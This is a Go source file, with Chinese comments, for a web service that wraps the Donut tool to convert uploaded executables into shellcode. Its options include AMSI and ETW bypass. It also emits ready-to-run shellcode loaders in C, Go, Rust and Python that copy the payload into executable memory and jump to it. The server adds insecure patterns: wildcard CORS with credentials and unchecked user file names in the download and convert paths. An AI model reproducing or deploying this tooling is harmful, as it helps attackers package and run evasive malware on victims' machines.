package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

const (
	WebPort       = 8080
	TempDir       = "./temp"
	DonutPath     = "./donut/donut.exe"
)

// 转换请求结构体
type ConvertRequest struct {
	InputFile    string `form:"inputFile" binding:"required"`
	Arch         string `form:"arch" binding:"required"` // x86, x64, x84
	Format       string `form:"format" binding:"required"` // c, ruby, python, powershell, base64, cs, hex, uuid
	ModuleName   string `form:"moduleName"`
	EntryPoint   string `form:"entryPoint"`
	Param        string `form:"param"`
	Compression  string `form:"compression"` // 0: none, 1: aplib, 2: lznt1, 3: xpress, 4: xpresshuff
	Bypass       string `form:"bypass"`     // 0: none, 1: etw, 2: aksi, 3: etw+amsi
	ExitThread   string `form:"exitThread"` // 0: exit, 1: thread
	ModuleOverload string `form:"moduleOverload"`
}

// 生成加载器请求结构体
type LoaderRequest struct {
	Shellcode    string `form:"shellcode" binding:"required"`
	ShellcodeType string `form:"shellcodeType" binding:"required"` // hex, base64, file
	OutputFormat string `form:"outputFormat" binding:"required"` // c, go, rust, python
}

func main() {
	// 创建临时目录
	if err := os.MkdirAll(TempDir, 0755); err != nil {
		log.Fatalf("创建临时目录失败: %v", err)
	}

	// 检查donut是否存在
	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
		log.Printf("警告: Donut可执行文件未找到，请确保它位于 %s", DonutPath)
	}

	// 设置Gin模式
	gin.SetMode(gin.ReleaseMode)

	// 创建路由
	r := gin.Default()

	// 配置CORS
	r.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"Origin", "Content-Type", "Accept"},
		ExposeHeaders:    []string{"Content-Length"},
		AllowCredentials: true,
	}))

	// 静态文件服务
	r.Static("/static", "./static")

	// 上传文件接口
	r.POST("/api/upload", handleUpload)

	// 转换shellcode接口
	r.POST("/api/convert", handleConvert)

	// 生成加载器接口
	r.POST("/api/generate-loader", handleGenerateLoader)

	// 下载文件接口
	r.GET("/api/download/:filename", handleDownload)

	// 根路径返回HTML页面
	r.GET("/", func(c *gin.Context) {
		c.File("./static/index.html")
	})

	// 启动服务器
	log.Printf("服务器启动在 http://localhost:%d", WebPort)
	if err := r.Run(fmt.Sprintf(":%d", WebPort)); err != nil {
		log.Fatalf("启动服务器失败: %v", err)
	}
}

// 处理文件上传
func handleUpload(c *gin.Context) {
	file, header, err := c.Request.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "文件上传失败: " + err.Error()})
		return
	}
	defer file.Close()

	// 创建唯一文件名
	ext := filepath.Ext(header.Filename)
	filename := fmt.Sprintf("%d%s", time.Now().Unix(), ext)
	filePath := filepath.Join(TempDir, filename)

	// 保存文件
	dst, err := os.Create(filePath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "创建文件失败: " + err.Error()})
		return
	}
	defer dst.Close()

	if _, err = io.Copy(dst, file); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存文件失败: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"filename": filename,
		"path":     filePath,
		"size":     header.Size,
		"type":     header.Header.Get("Content-Type"),
	})
}

// 处理shellcode转换
func handleConvert(c *gin.Context) {
	var req ConvertRequest
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效: " + err.Error()})
		return
	}

	// 检查输入文件是否存在
	inputPath := filepath.Join(TempDir, req.InputFile)
	if _, err := os.Stat(inputPath); os.IsNotExist(err) {
		c.JSON(http.StatusBadRequest, gin.H{"error": "输入文件不存在"})
		return
	}

	// 检查donut是否存在
	if _, err := os.Stat(DonutPath); os.IsNotExist(err) {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Donut可执行文件未找到，请确保它位于正确位置"})
		return
	}

	// 构建donut命令
	cmdArgs := []string{
		"-f", req.Format,
		"-a", req.Arch,
		inputPath,
	}

	// 添加可选参数
	if req.ModuleName != "" {
		cmdArgs = append(cmdArgs, "-n", req.ModuleName)
	}
	if req.EntryPoint != "" {
		cmdArgs = append(cmdArgs, "-e", req.EntryPoint)
	}
	if req.Param != "" {
		cmdArgs = append(cmdArgs, "-p", req.Param)
	}
	if req.Compression != "" && req.Compression != "0" {
		cmdArgs = append(cmdArgs, "-z", req.Compression)
	}
	if req.Bypass != "" && req.Bypass != "0" {
		cmdArgs = append(cmdArgs, "-b", req.Bypass)
	}
	if req.ExitThread != "" && req.ExitThread != "0" {
		cmdArgs = append(cmdArgs, "-t", req.ExitThread)
	}
	if req.ModuleOverload != "" {
		cmdArgs = append(cmdArgs, "-o", req.ModuleOverload)
	}

	// 执行donut命令
	cmd := exec.Command(DonutPath, cmdArgs...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "执行Donut失败: " + err.Error(),
			"stderr": stderr.String(),
		})
		return
	}

	// 解析输出，找到生成的shellcode文件
	output := out.String()
	var shellcodePath string
	for _, line := range strings.Split(output, "\n") {
		if strings.Contains(line, "保存到") || strings.Contains(line, "Saved to") {
			parts := strings.Split(line, ":")
			if len(parts) > 1 {
				shellcodePath = strings.TrimSpace(parts[1])
				break
			}
		}
	}

	// 如果找不到生成的文件路径，尝试默认路径
	if shellcodePath == "" {
		// 尝试根据输入文件生成默认输出文件名
		baseName := strings.TrimSuffix(req.InputFile, filepath.Ext(req.InputFile))
		shellcodePath = filepath.Join(TempDir, fmt.Sprintf("%s.c", baseName))
	}
	
	// 检查文件是否存在
	_, err := os.Stat(shellcodePath)
	if os.IsNotExist(err) {
		// 找不到生成的文件，返回donut的输出
		c.JSON(http.StatusOK, gin.H{
			"output": output,
			"hasFile": false,
		})
		return
	}

	// 读取生成的shellcode文件内容
	shellcodeContent, err := os.ReadFile(shellcodePath)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "读取shellcode文件失败: " + err.Error()})
		return
	}

	// 生成文件名用于下载
	shellcodeFilename := filepath.Base(shellcodePath)

	c.JSON(http.StatusOK, gin.H{
		"output": output,
		"shellcode": string(shellcodeContent),
		"filename": shellcodeFilename,
		"hasFile": true,
	})
}

// 处理加载器生成
func handleGenerateLoader(c *gin.Context) {
	var req LoaderRequest
	if err := c.ShouldBind(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "请求参数无效: " + err.Error()})
		return
	}

	var shellcode []byte
	var err error

	// 根据shellcode类型处理
	switch req.ShellcodeType {
	case "hex":
		shellcode, err = hex.DecodeString(strings.ReplaceAll(req.Shellcode, " ", ""))
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "无效的十六进制shellcode: " + err.Error()})
			return
		}
	case "base64":
		shellcode, err = base64.StdEncoding.DecodeString(req.Shellcode)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "无效的Base64 shellcode: " + err.Error()})
			return
		}
	case "file":
		filePath := filepath.Join(TempDir, req.Shellcode)
		shellcode, err = os.ReadFile(filePath)
		if err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "无法读取shellcode文件: " + err.Error()})
			return
		}
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的shellcode类型"})
		return
	}

	// 生成加载器代码
	var loaderCode string
	switch req.OutputFormat {
	case "c":
		loaderCode = generateCLoader(shellcode)
	case "go":
		loaderCode = generateGoLoader(shellcode)
	case "rust":
		loaderCode = generateRustLoader(shellcode)
	case "python":
		loaderCode = generatePythonLoader(shellcode)
	default:
		c.JSON(http.StatusBadRequest, gin.H{"error": "不支持的输出格式"})
		return
	}

	// 保存加载器代码到文件
	loaderFilename := fmt.Sprintf("loader.%s", getFileExtension(req.OutputFormat))
	loaderPath := filepath.Join(TempDir, loaderFilename)
	if err := os.WriteFile(loaderPath, []byte(loaderCode), 0644); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "保存加载器文件失败: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"loaderCode": loaderCode,
		"filename": loaderFilename,
	})
}

// 处理文件下载
func handleDownload(c *gin.Context) {
	filename := c.Param("filename")
	filePath := filepath.Join(TempDir, filename)

	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "文件不存在"})
		return
	}

	c.FileAttachment(filePath, filename)
}

// 生成C语言加载器
func generateCLoader(shellcode []byte) string {
	hexShellcode := hex.EncodeToString(shellcode)
	var formattedShellcode strings.Builder
	formattedShellcode.WriteString("unsigned char shellcode[] = {\n    ")

	for i := 0; i < len(hexShellcode); i += 2 {
		if i > 0 && i%32 == 0 {
			formattedShellcode.WriteString("\n    ")
		}
		formattedShellcode.WriteString("0x" + hexShellcode[i:i+2] + ", ")
	}

	formattedShellcode.WriteString("\n};")
	formattedShellcode.WriteString(`

#include <windows.h>
#include <stdio.h>

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}`)

	return formattedShellcode.String()
}

// 生成Go语言加载器
func generateGoLoader(shellcode []byte) string {
	hexShellcode := hex.EncodeToString(shellcode)
	var formattedShellcode strings.Builder
	formattedShellcode.WriteString("package main\n\nimport (\n    \"syscall\"\n    \"unsafe\"\n)\n\nvar shellcode = []byte{\n    ")

	for i := 0; i < len(hexShellcode); i += 2 {
		if i > 0 && i%32 == 0 {
			formattedShellcode.WriteString("\n    ")
		}
		n, _ := strconv.ParseUint(hexShellcode[i:i+2], 16, 8)
		formattedShellcode.WriteString(fmt.Sprintf("0x%02x, ", n))
	}

	formattedShellcode.WriteString("\n}\n\nfunc main() {\n    kernel32 := syscall.MustLoadDLL(\"kernel32.dll\")\n    virtualAlloc := kernel32.MustFindProc(\"VirtualAlloc\")\n    rtlCopyMemory := kernel32.MustFindProc(\"RtlCopyMemory\")\n    \n    addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)\n    rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))\n    syscall.Syscall(addr, 0, 0, 0, 0)\n}")

	return formattedShellcode.String()
}

// 生成Rust语言加载器
func generateRustLoader(shellcode []byte) string {
	hexShellcode := hex.EncodeToString(shellcode)
	var formattedShellcode strings.Builder
	formattedShellcode.WriteString("use std::ffi::c_void;\n\n#[link(name = \"kernel32\")]\nextern \"system\" {\n    fn VirtualAlloc(\n        lpAddress: *mut c_void,\n        dwSize: usize,\n        flAllocationType: u32,\n        flProtect: u32,\n    ) -> *mut c_void;\n    \n    fn RtlCopyMemory(\n        Destination: *mut c_void,\n        Source: *const c_void,\n        Length: usize,\n    );\n}\n\nfn main() {\n    let shellcode: &[u8] = &[\n        ")

	for i := 0; i < len(hexShellcode); i += 2 {
		if i > 0 && i%32 == 0 {
			formattedShellcode.WriteString("\n        ")
		}
		n, _ := strconv.ParseUint(hexShellcode[i:i+2], 16, 8)
		formattedShellcode.WriteString(fmt.Sprintf("0x%02x, ", n))
	}

	formattedShellcode.WriteString("\n    ];\n    \n    const MEM_COMMIT: u32 = 0x1000;\n    const MEM_RESERVE: u32 = 0x2000;\n    const PAGE_EXECUTE_READWRITE: u32 = 0x40;\n    \n    unsafe {\n        let addr = VirtualAlloc(\n            std::ptr::null_mut(),\n            shellcode.len(),\n            MEM_COMMIT | MEM_RESERVE,\n            PAGE_EXECUTE_READWRITE,\n        );\n        \n        RtlCopyMemory(addr, shellcode.as_ptr() as *const c_void, shellcode.len());\n        \n        let shellcode_fn: extern \"system\" fn() = std::mem::transmute(addr);\n        shellcode_fn();\n    }\n}")

	return formattedShellcode.String()
}

// 生成Python语言加载器
func generatePythonLoader(shellcode []byte) string {
	base64Shellcode := base64.StdEncoding.EncodeToString(shellcode)
	return fmt.Sprintf("import ctypes\nimport base64\n\nshellcode = base64.b64decode('%s')\n\nkernel32 = ctypes.windll.kernel32\nVirtualAlloc = kernel32.VirtualAlloc\nRtlCopyMemory = kernel32.RtlCopyMemory\n\nMEM_COMMIT = 0x1000\nMEM_RESERVE = 0x2000\nPAGE_EXECUTE_READWRITE = 0x40\n\n# 分配内存\nbuf = VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)\n\n# 复制shellcode到内存\nRtlCopyMemory(buf, (ctypes.c_char * len(shellcode)).from_buffer(shellcode), len(shellcode))\n\n# 创建函数指针并执行\nshellcode_func = ctypes.cast(buf, ctypes.CFUNCTYPE(ctypes.c_void_p))\nshellcode_func()", base64Shellcode)
}

// 获取文件扩展名
func getFileExtension(format string) string {
	switch format {
	case "c":
		return "c"
	case "go":
		return "go"
	case "rust":
		return "rs"
	case "python":
		return "py"
	default:
		return "txt"
	}
}